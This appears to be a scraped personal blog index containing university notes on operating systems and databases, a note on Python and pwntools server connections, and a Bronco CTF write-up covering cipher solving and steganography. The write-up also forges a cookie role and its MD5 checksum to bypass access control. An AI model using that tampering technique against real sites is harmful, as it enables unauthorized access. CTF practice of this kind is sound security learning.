镜像（Abbilder，指的是 VM 或容器的系统镜像（System Image），包含操作系统和应用程序的文件。）过大会导致部署（Deployment，指的是 将 VM 或容器的镜像部署到运行环境中的过程。）变慢。 攻击面（Angriffsfenster）过大，增加安全风险。 容器通常只为一个用户提供一个应用，所以包含许多不必要的功能。 所以我们可以考虑将 VM 作为一个应用进行编译（即 Library OS），用于创建一个最小化、专门针对特定应用优化的虚拟机。 Library OS 会像一个库（Bibliothek）一样运行。在编译过程中，仅包含所需的功能，整个系统可以通过编译器进行优化。一般只会运行一个进程（但支持多线程）。 Library OS 的理念可以理解为：将每个应用程序所依赖的 OS(操作系统) 的 personality(特性) 作为 library(库) ，使其独立地运行在该应用程序的地址空间上。 这种VM 被称为 Unikernel，意味着所有执行都在内核模式（Kernel Mode）进行，并且只有一个地址空间，因为整个 Unikernel 就是一个单进程应用。 缺点：应用程序必须经常进行调整（angepasset werden），因为它们在内部调用其他应用程序，但架构不支持这种调用。核心原因就是不支持多个进程交互。","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"container","slug":"container","permalink":"https://archer-baiyi.github.io/tags/container/"}]},{"title":"GBS-1-Einführung","slug":"TUM笔记/GBS/GBS-1-Einführung","date":"2025-03-11T17:15:25.000Z","updated":"2025-03-25T19:33:01.459Z","comments":true,"path":"2025/03/11/TUM笔记/GBS/GBS-1-Einführung/","permalink":"https://archer-baiyi.github.io/2025/03/11/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-1-Einf%C3%BChrung/","excerpt":"操作系统基础相关笔记","text":"Grundlagen: Betriebssysteme und SystemsoftwareAufgabe der Informatik:","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"Datenbank 笔记","slug":"TUM笔记/Datenbank/Datenbank-笔记","date":"2025-03-11T10:37:03.000Z","updated":"2025-03-25T19:32:36.783Z","comments":true,"path":"2025/03/11/TUM笔记/Datenbank/Datenbank-笔记/","permalink":"https://archer-baiyi.github.io/2025/03/11/TUM%E7%AC%94%E8%AE%B0/Datenbank/Datenbank-%E7%AC%94%E8%AE%B0/","excerpt":"数据库基础相关笔记","text":"1. Datenbankentwurf / ER-ModellierungEntity-relationship diagram Funktionalitäten: 1:1, 1:N, N:1, N:M Min-Max: (min,max) Multiplizität 2. Das Relationale ModellSchlüssel, Primärschlüssel Relationen mit gleichem Schlüssel kann man zusammenfassen. Anomalie: 异常 Die Relationale Algebra Selektion Projektion (会自动去重) Kreuzprodukt Join (Verbund) Umbenennung Mengendifferenz Division Vereinigung Mengendurchschnitt Semi-Join (linkes Argument wird gefiltert) (筛选左表，仅保留在右表中有匹配记录的左表行。) Semi-Join (rechtes Argument wird gefiltert) Anti-Semi-join ⟕ linker äußerer Join (会保留左表中的所有记录，即使在右表中没有匹配的记录时，右表对应的位置会以 NULL 填充。) ⟖ rechter äußerer Join ⟗ (voller) äußerer Join Der Relationenkalkül (relationaler Tupelkalkül) Bsp.: Der Domänenkalkül Bsp.: ü Diese 3 Sprachen sind gleich mächtig 3. SQLstandadisierte -Datendefinitions (DDL)- -Datenmanipulations (DML)- -Anfrage (Query)-Sprache Datendefinition (DDL)Datentypen: character(n), char(n) character varying(n), varchar(n) numeric(p,s), integer, decimal p（precision，精度）：数值的总位数（包含小数点前后的所有数字）。 s（scale，小数位数）：小数部分的位数（小数点后的位数）。 blob oder raw – für sehr große binäre Daten clob – für sehr große String-Attribute date – für Datumsangaben xml – für XML-Dokumente 1234create table Professoren ( PersNr integer not null, Name varchar(30) not null, Rang character(2)); DatenmanipulationEinfügen von Tupeln 1234insert into hörenselect MatrNr, VorlNrfrom Studenten, Vorlesungenwhere Titel = 'Logik'; 12insert into Studenten (MatrNr, Name)values (28121, 'Archimedes'); Löschen von Tupeln 12delete Studentenwhere Semester &gt; 13; Verändern von Tupeln 12update Studentenset Semester = Semester + 1; Anfrage123select (distinct) asfromwhere and Sortieren: 123select PersNr, Name, Rangfrom Professorenorder by Rang desc, Name asc; Mengenoperation: 1union, intersect, minus 12345selectfromwhere (not) exists (select from where)where not in () 比较： 1(where) value &gt;= ALL(子查询) Aggregationsfunktion: 1avg, max, min, count, sum Gruppierung: 1234selectfrom(where)group by Alle in der select-Klausel aufgeführten Attribute - außer den aggregierten - auch in der group by-Klausel aufgeführt werden. 比如说下面这里的gelesenVon, Name： 12345select gelesenVon, Name, sum(SWS)from Vorlesungen, Professorenwhere gelesenVon = PersNr and Rang = 'C4'group by gelesenVon, Name having avg(SWS) &gt;=3; Casting: 12cast(expression AS target_data_type)cast(h.AnzProVorl as decimal(6,2)) Allquantor und Implikation: ( \\forall t \\in R \\ (P(t)) ) \\Leftrightarrow ( \\neg (\\exists t \\in R \\ (\\neg P(t))) )(R \\Rightarrow T) \\Leftrightarrow (\\neg R \\lor T)Auswertung bei NULL-Werten and, between, in (1,2,3,4) like mit Platzhalter: “%” (für beliebig biele Zeichen) “_” (für genau ein Zeichen) case left/right/full outer join Rekursion Vorgänger des „Wiener Kreises“ der Tiefe n: 1234567891011select v1.Vorgängerfrom voraussetzen v1, ... voraussetzen vn_minus_1, voraussetzen vn, Vorlesungen vwhere v1.Nachfolger = v2.Vorgänger and ... vn_minus_1.Nachfolger = vn.Vorgänger and vn.Nachfolger = v.VorlNr and v.Titel = 'Der Wiener Kreis'; Mit Rekursion: 123456789101112131415161718192021with recursive TransVorl (Vorg, Nachf) as ( -- 递归的基础查询（初始层级） select Vorgänger, Nachfolger from voraussetzen union all -- 递归部分（从前一层继续查找更深的层级） select t.Vorg, v.Nachfolger from TransVorl t, voraussetzen v where t.Nachf = v.Vorgänger)select Titel from Vorlesungen where VorlNr in ( select Vorg from TransVorl where Nachf in ( select VorlNr from Vorlesungen where Titel = 'Der Wiener Kreis' )); 4. DatenintegritätIntegritätsbedingungen: -Schlüssel -Beziehungskardinalitäten -Attributdomänen -Inklusion bei Generalisierung Referentielle Integrität Fremdschlüssel Änderung von referenzierten Daten: Default 会拒绝执行主键的更改操作 cascade (Kaskadieren): 级联，外键会随着主键的更改一起更改 set NULL Statische Integritätsbedingungen: 12create table Studenten(Semester integer check Semester between 1 and 13) 12create table Prof(Rang character(2) check(Rang in ('C2','C3','C4'))) Konsistenzbedingung: 1234567create table prüfen(MatrNr ···VorNr ···Note ···primary key (MatrNr,VorNr))constraint VorherHören check (···) Trigger: 123456789101112131415161718192021-- 1. create trigger keine Degradierung-- 2.before update on Professorenfor each row-- 3.when (old.Rang is not null)begin-- 4. if :old.Rang = 'C3' and :new.Rang = 'C2' then :new.Rang := 'C3'; end if; if :old.Rang = 'C4' then :new.Rang := 'C4'; end if; if :new.Rang is null then :new.Rang := :old.Rang; end if;end; create trigger Anweisung, gefolgt von einem Namen, der Definition des Auslösers, in diesem Fall bevor eine Änderungsoperation (before update on) auf einer Zeile (for each row) der Tabelle Professoren ausgeführt werden kann, einer einschränkenden Bedingung (when) und einer Prozedurdefinition in der Oracle-proprietären Syntax. Temporale Daten 5. Relationale EntwurfstheorieFunktionale AbhängigkeitenFunctional Dependency (FD) A B C D a4 b2 c4 d3 a1 b1 c1 d1 a1 b1 c1 d2 a2 b2 c3 d2 a3 b2 c4 d3 R:= {A,B,C,D} 假设 : (可以理解成函数的 rechtseindeutig) Super-Schlüssel : ( 生成元) voll funktional abhängig von () : kann nicht mehr verkleinert werden () Kandidaten-Schlüssel: ( 最小生成元) Armstrong-Axiome FD-Hülle einer Attributmenge Kanonische Überdeckung 没有冗余的属性(Attribute)和依赖(Abhängigkeit) Berechnung: 消除右部冗余属性 (, 时仅保留 和 ) 消除左部冗余属性 删除冗余的函数依赖 (，， 时仅保留 和 ) R = R1 R2 2 Korrektheitskriterien für die Zerlegung von Relationenschemata: Verlustlosigkeit Abhängigkeitserhaltung verlustlose Zerlegung: ( R = R1 R2 ) Hinreichende Bedingung für die Verlustlosigkeit einer Zerlegung: oder NormalformenErste Normalform (1NF): Nur atomare Domäne. 都要是singleton，不能出现集合或者重复行 反例： Vater Mutter Kinder Johann Martha {Else, Lucie} Johann Maria {Theo, Josef} Heinz Martha {Cleo} 正例： Vater Mutter Kind Johann Martha Else Johann Martha Lucie Johann Maria Theo Johann Maria Josef Heinz Martha Cleo Zweite Normalform (2NF)： falls jedes Nicht(kandidat)schlüssel-Attribut voll funktional abhängig ist von jedem Kandidatenschlüssel der Relation. 假设R:= {A,B,C,D}的Kandidaten-Schlüssel是{A,B},那么需要满足C,D sind voll funktional abhängig von {A,B}。 只要出现类似{A} {C}之类的就不行了。 可以理解成不能有多余列。 Remark: 如果Kandidaten-Schlüssel只有一个元素，那么一定满足2NF。 反例（1非2）： A B C x a 1 x b 1 y c 2 {A,B}为Kandidaten-Schlüssel。有{A} {C}。 Dritte Normalform (3NF)： wenn für jede für geltende funktionale Abhängigkeit der Form mit und mindestens eine von drei Bedingungen gilt: , d.h., die FD ist trivial Das Attribut ist in einem Kandidatenschlüssel von enthalten – also ist prim ist Superschlüssel von 假如{A,B}是Kandidatenschlüssel，那么可以{C,D} {A}是符合第二条要求的。（但是这个不满足后面的BCNF） 反例（2非3）： A B C D x a 1 n x b 2 m y c 2 m 满足{A,B} {C}， {A,B} {D} voll，所以满足2NF； 有{C} {D}，所以不满足3NF。 Synthesealgorighmus: zerlegen R in R1,…,Rn, sodass: R1,…,Rn verlustlos R1,…,Rn abhägigkeitserhaltend Alle R1,…,Rn in 3NF Boyce-Codd-Normalform (BCNF)： wenn für jede für geltende funktionale Abhängigkeit der Form (FDs) und mindestens eine von drei Bedingungen gilt: , d.h., die FD ist trivial ist Superschlüssel von 反例（3非BCNF）： A B C D x a 1 1 x b 2 1 y a 3 2 y b 2 1 有 AB CD C B 因为B属于Kandidatschlüssel，所以满足3NF，但是不满足BCNF。 Man kann jede Relation verlustlos in BCNF-Relationen zerlegen, aber nicht unbedingt abhägigkeitserhaltend. Dekompositions-Algorithmus Mehrwertige Abhägigkeit (Multivalued Dependency, MVD): 2行对上，2行交叉对应 Jede FD is auch eine MVD: Eine MVD ist trivial iff: oder Vierte Normalform (4NF): falls für jede MVD eine der folgenden gilt: Die MVD ist trivial oder ist Superschlüssel von R 6. Physische DatenorganisationSpeicherhierarchieRegister Cache Hauptspeicher Plattenspeicher Archivspeicher RAIDRedundant Arrays of Independent Disks MTTF, MTTR, MTTDL RAID 0: Striping RAID 1: Spiegelung RAID 0+1(10): Striping und Spiegelung RAID 2: Striping auf Bit-Ebene RAID 3: Striping auf Bit-Ebene mit Paritätsinfo RAID 4: Striping von Blöcken RAID 5: Striping von Blöcken, Verteilung der Paritätsblöcke IndexstrukturenB-BäumeB+-BäumeErweiterbares HashingDynamisches Wachsen möglich Beispiel: gespiegelte binäre PersNr h(004) = 00100000… (4=0…0100) h(006) = 01100000… (6=0…0110) h(048) = 00001100… (48=0…0110000) Globale Tiefe Lokale Tiefe R-Baummehrdimensionalen Zugriffsstrukturen 7. AnfragebearbeitungLogische OptimierungKanonische Übersetzung: SQL Relationale Algebra Äquivalenzerhaltende Transformationsregeln 一共12条 Dependent Join Physische OptimierungNested Loop Joinforeach : ​ foreach : ​ if s.a=r.a then Res:= Res (r s) O(N*M) Block-Nested Loop Algorithmusforeach Block ​ foreach ​ foreach ​ if s.b = r.a then Res:= Res (r s) O(N * M/B) (M/B: Anzahl der Blöcke) Index-JoinVoraussetzung: 其中一个表是sortiert的且有B-Baum O(N * log(M)) Merge-JoinVoraus.: 2个表都是sortiert的 O(N+M) linear Hash-Join选定一个哈希函数h()，计算R.A的值，分配到hash buckets里，然后再计算S.B的值，在哈希桶里匹配。 不需要预先排序 Partitionieren und Hashing的话需要2个哈希函数。 O(N+M) linear Join mit Hashfilter (Bloom-Filter)需要很多个（k个）不同的哈希函数forall : 计算h_i(a) forall 0覆盖1。 会出现False Positive，但是不会出现False Negative Externes SortierenSelektivität Dynamische Programmierung: Phase: Zugriffspläne ermitteln Phase: Join-Pläne ermittel (2-fach, …, n-fach) Phase: Finalisierung 8. TransaktionsverwaltungBegin of Transaction (BOT)：转账开始的标志 read：读存款 write：写入（修改存款，出账入账） commit：转账结束，所有操作festschreiben abort：取消转账，所有状态复原 define savepoint backup transaction: Auf den jüngsten Sicherungspunkt zurücksetzen. commit work rollback work: Alle Änderungen sollen zurückgesetzt werden. ACID: Atomicity (Atomarität)：原子性。 Alles oder Nichts. Consistency：一致性。 Isolation：隔离性。 Durability (Dauerhaftigkeit)：持久性。 所有更改都必须永久存储。Änderungen erfolgreicher Transaktionen dürfen nie verloren gehen. 9. Fehlerbehandlung (Recovery)Fehlerklassifikation Lokaler Fhler in einer noch nicht festgeschriebenen Transaktion Wirkung zurücksetztenR1-Recovery Fehler mit Hauptspeicherverlust Abgeschlossene TAs erhalten bleiben R2-Recovery redo Noch nicht abgeschlossene TAs zurücksetzten R3-Recovery undo Fehler mit Hintergrundspeicherverlust R4-Recovery steal：未提交的事务修改的页面不会被替换。 steal：允许替换缓存中的任何非固定页面。 force：事务提交时立即将数据写入磁盘。 force：修改的数据仍可保留在缓存中，提高性能。 Auswirkung auf Recovery: force force steal - Kein Undo- Kein Redo - Kein Undo- Redo steal - Undo- Kein Redo - Undo- Redo Einbringungsstrategie（数据提交策略）: Update in Place：直接覆盖 Twin-Block-Verfahren：复制整个数据块 Schattenspeicherkonzept：复制修改的页面 Log-Einträge: LSN (Log Sequence Number)：日志序列号 Transaktionskennung(TA_ID) PageID Redo：纪录当前操作（比如说+=50） Undo：当前操作的逆向（比如-=50） PrevLSN：上一个日志记录的指针 [LSN, TransaktionsID, PageID, Redo, Undo, PrevLSN] （中括号） Protokollierung: Physische Protokollierung before-image：修改前的Zustand after-image Logische Protokollierung Undo-Code Redo-Code Log-Information会记录2次以上： Log-Datei R1,R2,R3 Log-Archiv R4 WAL-Prinzip (Write Ahead Log)： Commit前，确保所有相关的日志记录已写入日志文件。 modifizierte Seite auslagern前，确保相关日志记录已写入日志存档（Log-Archiv）。 Winner：在崩溃前已经完成，需要Redo Loser：在崩溃时仍然处于未提交状态，需要Undo Wiederanlauf: Analyse Log-Datei analysieren Winner-Menge ermitteln Loser-Menge ermitteln Redo Undo CLR: Compensating Log Record 用于记录撤销的操作。（给undo的） 简单来说就是为了预防恢复崩溃时发生的其他崩溃。 CLR-Einträge: LSN (Log Sequence Number)：日志序列号 Transaktionskennung(TA_ID) PageID Redo： PrevLSN：上一个日志记录的指针 UndoNxtLSN：Verweis auf die nächste rückgängig zu machende Änderung （尖括号） 注意：CLR没有undo信息。 3种Sicherungspunkte(-Qualitäten)： transaktionskonsistent （事务一致） 所有已提交的事务都被完全存储，未提交的都没有被写入磁盘。（只在所有活跃事务完成后进行检查点记录） aktionskonsistent （操作一致） 可能包含未提交的事务，但是所有操作都是完整的。 unscharf (fuzzy) 修改的页面不会立即写入磁盘，只记录“脏页”的信息，而不是数据本身 DirtyPages (Menge der modifizierten Seiten, 尚未写入磁盘), MinDirtyPageLSN, MinLSN R4-Recovery 10. MehrbenutzersynchronisationFehler (bei unkontroliertem Mehrbenutzerbetrieb): Lost Update: Verlorengegangene Änderungen Dirty Read: Abhängigkeit von nicht freigegebenen Änderungen Phantomproblem HistorieSeiralisierbarkeit 2 Historien äquivalent: wenn sie die Konfliktoperationen der nicht abgebrochenen Transaktionen in derselben Reihenfolge ausführen. SR: Eine Historie ist serialisierbar wenn sie äquivalent zu einer seriellen Historie Hs ist. Eine Historie H serialisierbar der zugehörige Serialisierbarkeitsgraph SG(H) azyklisch ist. liest von in der Historie H RC: rücksetzbare Historie kaskadierendes Rücksetzen (Cascading Rollback)： 假如T2读取了T1里被修改过但是还未被提交（commit）的数据，那么当T1 abort的时候，也需要abort T2。 ACA: Historien ohne kaskadierendes Rücksetzen (avoiding cascading abort) ST: Strikte Historien 想要对一个被修改过的对象进行操作前，必须要确保其已经被commit或者abort了。 Sperrbasierte Synchronisation （锁）Sperrmodi: S (shared, read lock) 允许多个事务（Transaktion）同时读取数据，但不能进行写操作。 X (exclusive, write lock) 允许事务对数据进行读取和写入，但其他事务不能同时访问该数据。 Verträglichkeitsmatrix / Kompatibilitätsmatrix: NL S X S ✅（兼容） ✅ ❌ X ✅ ❌（不兼容） ❌ Zwei-Phasen-Sperrprotokoll: Wachstumsphase：只获取锁 Schrumpfphase：只释放锁 Strenges Zwei-Phasen-Sperrprotokoll: 所有锁直到事务提交（commit）或回滚（abort）后才释放，避免级联回滚。 Verklemmungen (Deadlocks) Erkennung: Wartegraph Vermeidung: Preclaiming durch Zeitstempel Wound-Wait Strategie Wait-Die Strategie Multi-Granularity Locking (MGL) Phantomproblem: Zugriffsweg sperren Zeitstempel-basierende SynchronisationreadTS(A)：上次读取 A的时间戳。 writeTS(A)：上次写入 A 的时间戳。 Synchronisationsverfahren: 当 Ti 试图读取数据 A (ri(A))： 若 TS(Ti)&lt;writeTS(A)，则 Ti必须被回滚（因为 AAA 可能已被更新）。 否则，Ti可以继续读取，并更新 readTS(A) = max(TS(Ti), readTS(A))。 当 Ti 试图写入数据 A (wi(A))： 若 TS(Ti)&lt;readTS(A)，说明在 Ti之前已经有其他事务读取了 A，则 Ti 必须回滚。 若 TS(Ti)&lt;writeTS(A)，说明 Ti 试图覆盖一个更新的值，必须回滚。 否则，Ti可以写入，并更新 writeTS(A) = TS(Ti)。 Optimistische Synchronisation Lesephase Validierungsphase（验证） Schreibphase Snapshot Isolation Synchronisation von Indexstrukturen: zu aufwendig, redundante Transaktionsverwaltung in SQL92isolation level: read uncommited read commited repeatable read serializable","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"Dantenbank 数据库","slug":"TUM课程笔记/Dantenbank-数据库","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Dantenbank-%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/tags/SQL/"},{"name":"Datenbank","slug":"Datenbank","permalink":"https://archer-baiyi.github.io/tags/Datenbank/"},{"name":"Database","slug":"Database","permalink":"https://archer-baiyi.github.io/tags/Database/"},{"name":"数据库","slug":"数据库","permalink":"https://archer-baiyi.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"与服务器的交互","slug":"CTF/与服务器的交互","date":"2025-03-10T19:22:29.000Z","updated":"2025-03-31T12:45:34.302Z","comments":true,"path":"2025/03/10/CTF/与服务器的交互/","permalink":"https://archer-baiyi.github.io/2025/03/10/CTF/%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E4%BA%A4%E4%BA%92/","excerpt":"使用socket.socket()与remote（）连接服务器","text":"socket.socketsocket 是 Python 标准库中的模块，用于进行 TCP/UDP 连接。 假设服务器地址是 example.com，端口是 1234： 123456789101112131415161718192021import socket# 1. 创建一个TCP sockets = socket.socket()# 2. 连接远程服务器# connect的参数要求为一个tupels.connect((&quot;example.com&quot;, 1234))# 3. 发送数据（例如发送 &quot;Hello&quot;）# sendall() 默认发送的是 bytes 类型的数据，所以需要 b&quot;&quot; 或者 &quot;&quot;.encodes.sendall(b&quot;Hello\\n&quot;)# 4. 接收服务器返回的数据# 这个参数按需调节就好data = s.recv(1024) # 一次接收 1024 字节print(&quot;Received:&quot;, data.decode())# 5. 关闭连接s.close() 如果服务器会发送非常多的内容，则需要一直循环接收服务器发送的消息： 123456789101112131415161718192021import sockets = socket.socket()s.connect((&quot;example.com&quot;, 1234))# 持续接收数据，直到服务器关闭连接data = b&quot;&quot; # 用于存储完整的接收数据while True: part = s.recv(1024) # 每次读取 1024 字节 if not part: # 如果 part 为空，表示服务器关闭连接 break data += part # 累加数据# 按行分割并逐行打印lines = data.decode().splitlines()for line in lines: print(line)s.close() 也可以使用time.sleep()来确保收到完整信息： 12345678910111213141516import socketimport times = socket.socket()s.connect((&quot;example.com&quot;, 1234))s.sendall(b&quot;Hello\\n&quot;)time.sleep(0.5)data = s.recv(1024)print(&quot;Received:&quot;, data.decode())s.close() SSL连接 SSL 连接会比普通的TCP连接（socket.socket()）多一步加密的步骤 123456789101112131415161718import socketimport sslsock = socket.socket()# 使用 SSL 加密 sockets = ssl.wrap_socket(sock)s.connect((&quot;example.com&quot;, 1234))s.sendall(b&quot;Hello\\n&quot;)data = s.recv(1024)print(&quot;Received:&quot;, data.decode())s.close() pwntools的remotepwntools 是专门为 Pwn 题目设计的 Python 库，封装了 socket。 123456789101112131415from pwn import *# 1. 连接服务器r = remote(&quot;example.com&quot;, 1234)# 2. 发送数据r.sendline(b&quot;Hello&quot;) # 自动添加 &#x27;\\n&#x27;# 3. 接收数据response = r.recvall() # 读取所有信息# response = r.recvline() # 读取一整行print(&quot;Received:&quot;, response.decode())# 4. 关闭连接r.close() 比起socket，pwn拥有更高级的功能： 12345678910r.recvuntil(b&quot;\\n&quot;) #一直读数据，直到匹配特定字符串。# p.recvuntil(b&quot;Enter your name:&quot;)r.interactive() # 进入交互模式#比如说在pwn的题目里如果成功打开了shell（system(&quot;/bin/sh&quot;)），进入交互模式则可以直接手动执行命令。response = r.recvall()# recvall会自动读取所有可用数据 直到服务器关闭连接。不再需要像原生 socket 那样手写 while True 循环。r.sendafter(b&quot;input:&quot;, b&quot;1234&quot;) # 先等待服务器发送 input:，然后再发送 1234 remote() 里也可以启用 SSL： 12345678910from pwn import *r = remote(&quot;example.com&quot;, 1234, ssl=True) # 开启 SSL 加密r.sendline(b&quot;Hello&quot;) # 自动添加 &#x27;\\n&#x27;response = r.recvline()print(&quot;Received:&quot;, response.decode())r.close() 总的来说，在做CTF题目时，pwn的remote可以完成所有与服务器的交互。 socket.socket没有的remote有，socket.socket没有的remote也有。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"}],"tags":[{"name":"socket","slug":"socket","permalink":"https://archer-baiyi.github.io/tags/socket/"},{"name":"remote","slug":"remote","permalink":"https://archer-baiyi.github.io/tags/remote/"}]},{"title":"Bronco CTF Write Up","slug":"CTF/Writeup/Bronco-CTF-Write-Up","date":"2025-03-10T12:28:52.000Z","updated":"2025-03-25T19:31:22.365Z","comments":true,"path":"2025/03/10/CTF/Writeup/Bronco-CTF-Write-Up/","permalink":"https://archer-baiyi.github.io/2025/03/10/CTF/Writeup/Bronco-CTF-Write-Up/","excerpt":"Bronco CTF比赛的题解，涉及方向：Crypto, Web, Reverse, Steg, Misc, Forensics","text":"BeginnerBreak the Battalion 这道题我们会拿到一份ELF文件，我们用IDA打开它会看到 可以发现，这个程序的核心内容是encrypt，所以我们查看一下它的内容： 写一段python便可以简单得知输入什么内容最后会输出“brigade”： 12345678def decrypt(encrypted): return &#x27;&#x27;.join(chr(ord(c) ^ 0x50) for c in encrypted)encrypted = &quot;brigade&quot;original_input = decrypt(encrypted)print(f&quot;Original input: &#123;original_input&#125;&quot;)# Original input: 2&quot;97145 所以flag为： 1bronco&#123;2&quot;97145&#125; (吐槽一下，这个flag的内容真的非常奇怪，一般都是会带点正常单词的。) Simon Says 这道题我们会拿到这样一张图片： 并没有任何有用的内容。根据题目描述我们猜测这道题用了LSB隐写，所以用Stegsolve打开图片便可得到： flag为： 1bronco&#123;simon_says_submit_this_flag&#125; Too Many Emojis这道题我们会得到一串emoji内容： 因为知道flag的格式为bronco{}，所以可以确定这个应该是单表加密，并且知道前6个emoji对应的明文。 经过一系列搜索与排查可以发现每一个emoji对应的字母为这个emoji的官方英文名的首字母，根据这个线索我们可以通过找到的这些信息来解密内容： （用到的网站：https://unicode.org/emoji/charts/full-emoji-list.html） 这里有一个小技巧：如果找不到想要的 emoji，可以描述给 ChatGPT 并询问其官方名称，再到网站上用名称（或部分名称）搜索，确认是否是我们需要的。 最后得到flag： 1bronco&#123;emojis_express_my_emotions&#125; Straight Up Circular 这道题给出的加密字符串如下： 1dvlby_otspnr&#123;cobrnot450i1nm_e03&#125; 首先，通过 &#123;&#125; 的位置，我们可以判断这并不是替换加密。其次，我们发现 bronco&#123;&#125;（该比赛的 flag 统一格式）中的每个字母和符号都出现在了这串字符串中，因此很可能是某种乱序加密。 先确定 b、r、o 等字母在加密字符串中的具体位置，再根据题目名字（Straight Up Circular）不难发现这个用这个规律可以得到的flag开头： 从字符串正中间的 b 出发 先向右移动 1 位 再向左移动 2 位 接着向右移动 3 位 依此类推…… 继续这个流程便可以成功获得flag： 1bronco&#123;tr4n5p0sit1on_my_bel0v3d&#125; CryptoAcross the Tracks 我们会得到一段内容： 1Samddre··ath·dhf@_oesoere·ebun·yhot·no··oso·i·a·lr1rcm·iS·aruf·toibadhn·nadpikudynea&#123;l_oeee·ch·oide·f·n·aoe·sae·aonbdhgo_so·rr.i·tYnl·s·tdot·xs·hdtyy&#x27;·.t·cfrlca·epeo·iufiyi.t·yaaf·.a.·ts··tn33&#125;i·tvhr·.tooho···rlmwuI·h·e·iHshonppsoleaseecrtudIdet.·n·BtIpdheiorcihr·or·ovl·c··i·acn·t·su··ootr·:b3cesslyedheIath·e·_ 根据题目描述我们猜测这段内容使用了栅栏密码，并且key为题目描述中提到的“tenth”（10）。解密即可得到flag： 1bronco&#123;r@1l_f3nc3_cip3rs_r_cool&#125; Rahhh-SA 这道题我们会得到以下内容： 1234e = 65537n = 3429719c = [-53102, -3390264, -2864697, -3111409, -2002688, -2864697, -1695722, -1957072, -1821648, -1268305, -3362005, -712024, -1957072, -1821648, -1268305, -732380, -2002688, -967579, -271768, -3390264, -712024, -1821648, -3069724, -732380, -892709, -271768, -732380, -2062187, -271768, -292609, -1599740, -732380, -1268305, -712024, -271768, -1957072, -1821648, -3418677, -732380, -2002688, -1821648, -3069724, -271768, -3390264, -1847282, -2267004, -3362005, -1764589, -293906, -1607693]p = -811 首先注意到c的所有内容都是负数，但是其绝对值都小于等于n，所有猜测将其直接放进 $\\mathbb{Z}/n\\mathbb{Z}$ 进行计算即可。但因为发现$p’ := n+p = 3,428,908$ 并不是n的因数，所以尝试 $3429719/811=4229$ ，发现结果为整数。 所以写一段python代码来尝试RSA解码即可： 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python3e = 65537n = 3429719p = 811 # 题中写的是 -811，这里只取绝对值q = n // p # 4229# 计算 phi(n)phi = (p - 1) * (q - 1) # (811 - 1)*(4229 - 1) = 810*4228 = 3424680# 求 d = e^-1 mod phi(n)# Python 3.8+ 可以直接用 pow(e, -1, phi) 得到模逆d = pow(e, -1, phi)# 给出的负数密文c_list = [ -53102, -3390264, -2864697, -3111409, -2002688, -2864697, -1695722, -1957072, -1821648, -1268305, -3362005, -712024, -1957072, -1821648, -1268305, -732380, -2002688, -967579, -271768, -3390264, -712024, -1821648, -3069724, -732380, -892709, -271768, -732380, -2062187, -271768, -292609, -1599740, -732380, -1268305, -712024, -271768, -1957072, -1821648, -3418677, -732380, -2002688, -1821648, -3069724, -271768, -3390264, -1847282, -2267004, -3362005, -1764589, -293906, -1607693]# 解密plaintext_nums = []for c in c_list: # 先把负数转为 mod n 内的非负代表元 c_mod = c % n m = pow(c_mod, d, n) plaintext_nums.append(m)message = &#x27;&#x27;.join(chr(m) for m in plaintext_nums)print(&quot;解密后得到的数值:&quot;, plaintext_nums)print(&quot;尝试映射到字符后的结果:&quot;)print(message)# bronco&#123;m4th3m4t1c5_r34l1y_1s_qu1t3_m4g1c4l_raAhH!&#125; WebGrandma’s Secret Recipe （因为这份食谱离婚了实在是有点抽象） 点击网站可以看到： 点开Cookie可以发现有2条内容： 12checksum: a223befb6660a23f9c3491f74ef84e43role: &quot;kitchen helper&quot; 结果检查发现checksum为role的md5结果： 所以我们将role改为：”grandma”，并且将checksum改为a5d19cdd5fd1a8f664c0ee2b5e293167（=md5(grandma))。点击“Grandma’s Pantry“便可以看到： 得到flag： 